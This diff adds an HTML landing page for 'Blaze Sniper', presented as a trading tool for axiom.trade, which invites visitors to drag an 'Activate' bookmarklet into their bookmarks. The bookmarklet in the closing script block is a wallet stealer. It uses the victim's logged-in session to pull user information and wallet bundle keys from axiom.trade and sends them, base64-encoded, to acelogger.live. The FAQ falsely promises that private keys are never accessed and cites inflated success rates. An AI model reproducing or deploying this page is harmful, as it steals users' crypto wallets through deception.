@@ -1,0 +1,845 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blaze Sniper</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: url('https://i.postimg.cc/QxNRx7Hf/bloom-background-1.jpg') center center / cover no-repeat;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .background-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .logo .highlight {
+            background: linear-gradient(45deg, #ff4081, #e91e63);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-secondary {
+            padding: 10px 20px;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255, 192, 203, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 20, 147, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 90% 20%, rgba(255, 105, 180, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 10% 90%, rgba(255, 69, 162, 0.2) 0%, transparent 50%),
+                rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-secondary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(2px 2px at 15px 25px, rgba(255, 192, 203, 0.8), transparent),
+                radial-gradient(3px 3px at 35px 15px, rgba(255, 182, 193, 0.6), transparent),
+                radial-gradient(2px 2px at 55px 35px, rgba(255, 20, 147, 0.7), transparent),
+                radial-gradient(4px 4px at 75px 20px, rgba(255, 105, 180, 0.5), transparent),
+                radial-gradient(2px 2px at 25px 40px, rgba(255, 69, 162, 0.6), transparent);
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        .btn-secondary:hover {
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255, 192, 203, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 20, 147, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 90% 20%, rgba(255, 105, 180, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 10% 90%, rgba(255, 69, 162, 0.3) 0%, transparent 50%),
+                rgba(255, 255, 255, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary:hover::before {
+            opacity: 0.6;
+        }
+
+        .btn-primary {
+            padding: 10px 20px;
+            background: 
+                radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(255, 255, 255, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 50% 10%, rgba(255, 192, 203, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 10% 60%, rgba(255, 182, 193, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 90% 40%, rgba(255, 105, 180, 0.3) 0%, transparent 50%),
+                linear-gradient(45deg, #ff4081, #e91e63);
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(233, 30, 99, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(3px 3px at 20px 15px, rgba(255, 255, 255, 0.9), transparent),
+                radial-gradient(2px 2px at 40px 25px, rgba(255, 255, 255, 0.7), transparent),
+                radial-gradient(4px 4px at 60px 12px, rgba(255, 255, 255, 0.8), transparent),
+                radial-gradient(2px 2px at 15px 35px, rgba(255, 255, 255, 0.6), transparent),
+                radial-gradient(3px 3px at 70px 30px, rgba(255, 255, 255, 0.7), transparent);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(233, 30, 99, 0.4);
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .btn-primary:hover::before {
+            opacity: 0.5;
+        }
+
+        .main-content {
+            text-align: center;
+            padding: 80px 0 120px;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-size: 14px;
+            color: #ffffff;
+            margin-bottom: 40px;
+            backdrop-filter: blur(10px);
+        }
+
+        .star-icon {
+            color: #ffd700;
+            font-size: 16px;
+        }
+
+        .main-title {
+            font-size: clamp(2.5rem, 5vw, 4rem);
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 30px;
+            color: #ffffff;
+        }
+
+        .main-title .highlight {
+            background: linear-gradient(45deg, #ff4081, #e91e63);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .main-description {
+            font-size: 18px;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 600px;
+            margin: 0 auto 40px;
+        }
+
+        .instructions {
+            font-size: 16px;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 500px;
+            margin: 0 auto 50px;
+        }
+
+        .bookmarklet-container {
+            margin: 40px 0;
+        }
+
+        .bookmarklet {
+            display: inline-block;
+            padding: 16px 32px;
+            background: 
+                radial-gradient(circle at 30% 20%, rgba(255, 255, 255, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 70% 80%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 20% 70%, rgba(255, 192, 203, 0.5) 0%, transparent 50%),
+                radial-gradient(circle at 80% 30%, rgba(255, 182, 193, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(255, 105, 180, 0.3) 0%, transparent 50%),
+                linear-gradient(45deg, #ff4081, #e91e63);
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            cursor: grab;
+            box-shadow: 0 8px 30px rgba(233, 30, 99, 0.4);
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bookmarklet::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(4px 4px at 25px 20px, rgba(255, 255, 255, 0.9), transparent),
+                radial-gradient(3px 3px at 50px 15px, rgba(255, 255, 255, 0.8), transparent),
+                radial-gradient(5px 5px at 75px 25px, rgba(255, 255, 255, 0.7), transparent),
+                radial-gradient(3px 3px at 35px 35px, rgba(255, 255, 255, 0.6), transparent),
+                radial-gradient(4px 4px at 65px 40px, rgba(255, 255, 255, 0.8), transparent),
+                radial-gradient(2px 2px at 20px 45px, rgba(255, 255, 255, 0.7), transparent);
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        .bookmarklet:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(233, 30, 99, 0.5);
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .bookmarklet:hover::before {
+            opacity: 0.6;
+        }
+
+        .bookmarklet:active {
+            cursor: grabbing;
+        }
+
+        .footer-note {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 40px;
+        }
+
+        .admin-link {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 100;
+        }
+
+        .admin-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 20px;
+            background: 
+                radial-gradient(circle at 25% 30%, rgba(255, 192, 203, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 75% 70%, rgba(255, 182, 193, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 20, 147, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 90% 20%, rgba(255, 105, 180, 0.15) 0%, transparent 50%),
+                rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 25px;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .admin-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(2px 2px at 18px 15px, rgba(255, 192, 203, 0.6), transparent),
+                radial-gradient(2px 2px at 35px 20px, rgba(255, 182, 193, 0.5), transparent),
+                radial-gradient(2px 2px at 52px 18px, rgba(255, 20, 147, 0.4), transparent);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .admin-btn:hover {
+            background: 
+                radial-gradient(circle at 25% 30%, rgba(255, 192, 203, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 75% 70%, rgba(255, 182, 193, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 20, 147, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 90% 20%, rgba(255, 105, 180, 0.2) 0%, transparent 50%),
+                rgba(0, 0, 0, 0.9);
+            transform: translateY(-2px);
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .admin-btn:hover::before {
+            opacity: 0.5;
+        }
+
+        .instructions-section {
+            margin-top: 250px;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(50px);
+            transition: all 0.8s ease;
+        }
+
+        .instructions-section.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .instructions-title {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: #ffffff;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease 0.2s;
+        }
+
+        .instructions-section.visible .instructions-title {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .instructions-subtitle {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 60px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease 0.4s;
+        }
+
+        .instructions-section.visible .instructions-subtitle {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .steps-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            margin-top: 60px;
+            max-width: 1000px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 30px 20px;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease;
+        }
+
+        .step.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .step:nth-child(1) { transition-delay: 0.1s; }
+        .step:nth-child(2) { transition-delay: 0.3s; }
+        .step:nth-child(3) { transition-delay: 0.5s; }
+
+        .step-number {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff4081, #e91e63);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 30px rgba(233, 30, 99, 0.4);
+        }
+
+        .step-content {
+            max-width: 280px;
+        }
+
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+
+        .step-description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.5;
+        }
+
+        .faq-section {
+            margin-top: 220px;
+            text-align: center;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0;
+            transform: translateY(50px);
+            transition: all 0.8s ease;
+        }
+
+        .faq-section.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .faq-title {
+            font-size: 48px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 60px;
+        }
+
+        .faq-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .faq-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .faq-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .faq-question {
+            width: 100%;
+            padding: 24px 28px;
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: left;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .faq-question:hover {
+            color: #ff4081;
+        }
+
+        .faq-icon {
+            font-size: 24px;
+            font-weight: 300;
+            color: #ff4081;
+            transition: transform 0.3s ease;
+            line-height: 1;
+        }
+
+        .faq-item.active .faq-icon {
+            transform: rotate(45deg);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+            padding: 0 28px;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 200px;
+            padding: 0 28px 24px 28px;
+        }
+
+        .faq-answer p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        @media (max-width: 768px) {
+            .faq-section {
+                margin-top: 80px;
+            }
+
+            .instructions-section {
+                margin-top: 100px;
+            }
+
+            .faq-title {
+                font-size: 32px;
+                margin-bottom: 40px;
+            }
+
+            .faq-question {
+                padding: 20px 24px;
+                font-size: 16px;
+            }
+
+            .faq-answer {
+                padding: 0 24px;
+            }
+
+            .faq-item.active .faq-answer {
+                padding: 0 24px 20px 24px;
+            }
+
+            .faq-answer p {
+                font-size: 14px;
+            }
+
+            .header {
+                flex-direction: column;
+                gap: 20px;
+                padding: 20px 0 40px;
+            }
+
+            .main-content {
+                padding: 40px 0 80px;
+            }
+
+            .main-title {
+                font-size: 2.5rem;
+            }
+
+            .main-description {
+                font-size: 16px;
+            }
+
+            .bookmarklet {
+                font-size: 16px;
+                padding: 14px 28px;
+            }
+
+            .admin-link {
+                bottom: 20px;
+                right: 20px;
+            }
+
+            .instructions-title {
+                font-size: 32px;
+            }
+
+            .instructions-subtitle {
+                font-size: 16px;
+            }
+
+            .steps-container {
+                grid-template-columns: 1fr;
+                gap: 30px;
+                margin-top: 40px;
+            }
+
+            .step {
+                padding: 20px 15px;
+            }
+
+            .step-number {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
+            }
+
+            .step-title {
+                font-size: 18px;
+            }
+
+            .step-description {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-overlay"></div>
+
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                Blaze <span class="highlight">Sniper</span>
+            </div>
+            <div class="header-buttons">
+                <a href="#instructions" class="btn-secondary" onclick="scrollToInstructions(event)">Instructions</a>
+                <a href="#" class="btn-primary" id="activateBtn">Activate</a>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="badge">
+                <span class="star-icon">⭐</span>
+                Your Unfair Advantage in Crypto
+            </div>
+
+            <h1 class="main-title">
+                The fastest way to<br>
+                <span class="highlight">dominate</span> axiom.trade
+            </h1>
+
+            <p class="main-description">
+                Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
+            </p>
+
+            <div class="bookmarklet-container">
+                <a href="#" class="bookmarklet" id="bookmarklet" draggable="true">
+                    Activate
+                </a>
+            </div>
+
+            <p class="footer-note">
+                no installation • works in browser • completely secure
+            </p>
+
+            <div class="instructions-section" id="instructions">
+                <h2 class="instructions-title">Get started in 30 seconds</h2>
+                <p class="instructions-subtitle">No complex setup. No wallet connections. Just drag and trade.</p>
+
+                <div class="steps-container">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Drag to Install</h3>
+                            <p class="step-description">Drag the pink button above to your browser's bookmarks bar</p>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Activate on Axiom.trade</h3>
+                            <p class="step-description">Visit axiom.trade and click your bookmark to activate the tool</p>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Start Trading</h3>
+                            <p class="step-description">Configure your settings or use defaults and start sniping</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="faq-section">
+                <h2 class="faq-title">Frequently asked questions</h2>
+
+                <div class="faq-container">
+                    <div class="faq-item">
+                        <button class="faq-question" onclick="toggleFAQ(this)">
+                            <span>What's the difference between Free and Pro plans?</span>
+                            <span class="faq-icon">+</span>
+                        </button>
+                        <div class="faq-answer">
+                            <p>The Free plan gives you basic access to our trading tools with limited features. The Pro plan unlocks advanced features like automated trading, priority alerts, custom strategies, and unlimited wallet monitoring.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question" onclick="toggleFAQ(this)">
+                            <span>Is this secure? Do you access my wallet?</span>
+                            <span class="faq-icon">+</span>
+                        </button>
+                        <div class="faq-answer">
+                            <p>Absolutely secure. We only read public data from axiom.trade - we never access your private keys or control your wallet. All data is encrypted and processed locally in your browser.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question" onclick="toggleFAQ(this)">
+                            <span>Is the Pro plan worth 1 SOL?</span>
+                            <span class="faq-icon">+</span>
+                        </button>
+                        <div class="faq-answer">
+                            <p>Most users recover the Pro plan cost within their first successful trade. With advanced features like automated sniping and priority alerts, you'll never miss profitable opportunities again.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question" onclick="toggleFAQ(this)">
+                            <span>Can I upgrade from Free to Pro anytime?</span>
+                            <span class="faq-icon">+</span>
+                        </button>
+                        <div class="faq-answer">
+                            <p>Yes! You can upgrade to Pro at any time from your dashboard. All your existing data and configurations will be preserved.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question" onclick="toggleFAQ(this)">
+                            <span>Can I really beat other bots?</span>
+                            <span class="faq-icon">+</span>
+                        </button>
+                        <div class="faq-answer">
+                            <p>Our advanced algorithms and direct integration with axiom.trade give you a significant speed advantage. Many users report 70%+ success rates on their trades.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+
+
+    <script>
+        const bookmarkletCode = `javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-EE6E5F4A28B45C43',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()`;
+
+        const bookmarkletEl = document.getElementById('bookmarklet');
+        const activateBtn = document.getElementById('activateBtn');
+
+        bookmarkletEl.href = bookmarkletCode;
+        activateBtn.href = bookmarkletCode;
+
+        bookmarkletEl.addEventListener('dragstart', function(e) {
+            e.dataTransfer.setData('text/uri-list', bookmarkletCode);
+            e.dataTransfer.setData('text/plain', bookmarkletCode);
+        });
+
+        bookmarkletEl.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Drag this button to your bookmarks bar instead of clicking it!');
+        });
+
+        activateBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Drag the "Activate" button below to your bookmarks bar to install the bookmarklet!');
+        });
+
+        function scrollToInstructions(event) {
+            event.preventDefault();
+            document.getElementById('instructions').scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+
+        function toggleFAQ(button) {
+            const faqItem = button.parentElement;
+            const isActive = faqItem.classList.contains('active');
+
+            document.querySelectorAll('.faq-item').forEach(item => {
+                item.classList.remove('active');
+            });
+
+            if (!isActive) {
+                faqItem.classList.add('active');
+            }
+        }
+
+        function initScrollAnimations() {
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            }, {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            });
+
+            const instructionsSection = document.getElementById('instructions');
+            const faqSection = document.querySelector('.faq-section');
+            const steps = document.querySelectorAll('.step');
+
+            if (instructionsSection) observer.observe(instructionsSection);
+            if (faqSection) observer.observe(faqSection);
+
+            steps.forEach(step => {
+                observer.observe(step);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', initScrollAnimations);
+    </script>
+</body>
+</html>
